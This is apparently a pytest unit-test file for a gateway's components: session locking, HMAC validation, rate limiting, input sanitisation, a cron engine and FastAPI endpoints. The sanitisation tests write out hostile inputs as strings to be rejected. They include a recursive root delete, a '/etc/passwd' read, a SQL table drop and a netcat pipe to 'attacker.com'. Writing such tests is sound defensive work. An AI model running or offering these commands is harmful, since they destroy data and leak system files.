"""Unit tests for Gateway Core components."""

import asyncio
import hmac
import hashlib
from datetime import datetime
from unittest.mock import AsyncMock, Mock, patch

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient


class TestInternalMessage:
    """Test InternalMessage dataclass."""

    def test_create_internal_message(self):
        """Test creating an internal message."""
        from museclaw.gateway.message import InternalMessage

        msg = InternalMessage(
            source="telegram",
            session_id="test_123",
            user_id="user_456",
            content="Hello",
            timestamp=datetime.now(),
            trust_level="verified",
            metadata={},
        )

        assert msg.source == "telegram"
        assert msg.session_id == "test_123"
        assert msg.user_id == "user_456"
        assert msg.content == "Hello"
        assert msg.trust_level == "verified"

    def test_message_validation(self):
        """Test message field validation."""
        from museclaw.gateway.message import InternalMessage

        with pytest.raises((ValueError, TypeError)):
            InternalMessage(
                source="",  # Empty source should fail
                session_id="test_123",
                user_id="user_456",
                content="Hello",
                timestamp=datetime.now(),
                trust_level="verified",
                metadata={},
            )


class TestSessionManager:
    """Test Session Manager."""

    @pytest.mark.asyncio
    async def test_acquire_lock(self):
        """Test acquiring session lock."""
        from museclaw.gateway.session import SessionManager

        manager = SessionManager()
        session_id = "test_session"

        # First acquire should succeed
        acquired = await manager.acquire(session_id)
        assert acquired is True

        # Second acquire for same session should fail (already locked)
        acquired = await manager.acquire(session_id)
        assert acquired is False

        # Release and try again
        await manager.release(session_id)
        acquired = await manager.acquire(session_id)
        assert acquired is True

        await manager.release(session_id)

    @pytest.mark.asyncio
    async def test_session_serialization(self):
        """Test that sessions are processed serially."""
        from museclaw.gateway.session import SessionManager

        manager = SessionManager()
        session_id = "test_session"
        results = []

        async def task(delay: float, value: str):
            if await manager.acquire(session_id):
                try:
                    await asyncio.sleep(delay)
                    results.append(value)
                finally:
                    await manager.release(session_id)

        # Start two tasks
        await asyncio.gather(task(0.1, "first"), task(0.05, "second"))

        # First task should complete first (despite longer delay)
        # because it acquired lock first
        assert results[0] == "first"

    @pytest.mark.asyncio
    async def test_is_processing(self):
        """Test checking if session is processing."""
        from museclaw.gateway.session import SessionManager

        manager = SessionManager()
        session_id = "test_session"

        assert manager.is_processing(session_id) is False

        await manager.acquire(session_id)
        assert manager.is_processing(session_id) is True

        await manager.release(session_id)
        assert manager.is_processing(session_id) is False


class TestSecurityGate:
    """Test Security Gate."""

    def test_hmac_validation_success(self):
        """Test HMAC signature validation success."""
        from museclaw.gateway.security import SecurityGate

        secret = "test_secret_key"
        gate = SecurityGate(hmac_secret=secret)

        payload = b'{"test": "data"}'
        signature = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

        assert gate.validate_hmac(payload, signature) is True

    def test_hmac_validation_failure(self):
        """Test HMAC signature validation failure."""
        from museclaw.gateway.security import SecurityGate

        gate = SecurityGate(hmac_secret="test_secret_key")

        payload = b'{"test": "data"}'
        invalid_signature = "invalid_signature"

        assert gate.validate_hmac(payload, invalid_signature) is False

    @pytest.mark.asyncio
    async def test_rate_limiting(self):
        """Test rate limiting."""
        from museclaw.gateway.security import SecurityGate

        gate = SecurityGate(rate_limit_per_minute=5)
        user_id = "test_user"

        # First 5 requests should pass
        for _ in range(5):
            assert gate.check_rate_limit(user_id) is True

        # 6th request should be blocked
        assert gate.check_rate_limit(user_id) is False

    def test_input_sanitization(self):
        """Test input sanitization."""
        from museclaw.gateway.security import SecurityGate

        gate = SecurityGate()

        # Normal input should pass
        assert gate.sanitize_input("Hello world") == "Hello world"

        # Suspicious input should be flagged
        suspicious = "rm -rf / && malicious"
        with pytest.raises(ValueError, match="Suspicious"):
            gate.sanitize_input(suspicious)

    def test_command_injection_detection(self):
        """Test command injection detection."""
        from museclaw.gateway.security import SecurityGate

        gate = SecurityGate()

        dangerous_patterns = [
            "$(cat /etc/passwd)",
            "; DROP TABLE users;",
            "| nc attacker.com 1234",
            "`whoami`",
        ]

        for pattern in dangerous_patterns:
            with pytest.raises(ValueError, match="Suspicious"):
                gate.sanitize_input(pattern)


class TestCronEngine:
    """Test Cron Engine."""

    @pytest.mark.asyncio
    async def test_add_job(self):
        """Test adding a cron job."""
        from museclaw.gateway.cron import CronEngine

        engine = CronEngine()
        job_called = False

        async def test_job():
            nonlocal job_called
            job_called = True

        job_id = engine.add_job(
            func=test_job, trigger="interval", seconds=1, job_id="test_heartbeat"
        )

        assert job_id == "test_heartbeat"

        # Start engine and wait for job to run
        engine.start()
        await asyncio.sleep(1.5)

        assert job_called is True

        engine.shutdown()

    def test_remove_job(self):
        """Test removing a cron job."""
        from museclaw.gateway.cron import CronEngine

        engine = CronEngine()

        async def test_job():
            pass

        job_id = engine.add_job(func=test_job, trigger="interval", seconds=60, job_id="test_job")

        # Job should exist
        assert engine.get_job(job_id) is not None

        # Remove job
        engine.remove_job(job_id)

        # Job should no longer exist
        assert engine.get_job(job_id) is None

        engine.shutdown()

    def test_cron_expression(self):
        """Test cron expression parsing."""
        from museclaw.gateway.cron import CronEngine

        engine = CronEngine()

        async def nightly_job():
            pass

        # Add job with cron expression (every day at 2am)
        job_id = engine.add_job(
            func=nightly_job, trigger="cron", hour=2, minute=0, job_id="nightly"
        )

        assert job_id == "nightly"
        assert engine.get_job(job_id) is not None

        engine.shutdown()


class TestGatewayServer:
    """Test Gateway FastAPI server."""

    def test_localhost_binding(self):
        """Test that server only binds to localhost."""
        from museclaw.gateway.server import create_app

        app = create_app()

        # Check that the app is created
        assert app is not None

        # In actual deployment, uvicorn.run() would be called with host="127.0.0.1"
        # This is configured in server.py's main() function

    @pytest.mark.asyncio
    async def test_health_endpoint(self):
        """Test health check endpoint."""
        from museclaw.gateway.server import create_app

        app = create_app()
        client = TestClient(app)

        response = client.get("/health")
        assert response.status_code == 200
        assert response.json()["status"] == "healthy"

    @pytest.mark.asyncio
    async def test_webhook_endpoint_with_valid_hmac(self):
        """Test webhook endpoint with valid HMAC."""
        from museclaw.gateway.server import create_app

        app = create_app()
        client = TestClient(app)

        secret = "test_secret"
        payload = b'{"message": "test"}'
        signature = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

        # Mock the security gate
        with patch("museclaw.gateway.server.security_gate") as mock_gate:
            mock_gate.validate_hmac.return_value = True
            mock_gate.sanitize_input.return_value = '{"message": "test"}'
            mock_gate.check_rate_limit.return_value = True

            response = client.post(
                "/webhook", content=payload, headers={"X-Signature": signature}
            )

            assert response.status_code == 200
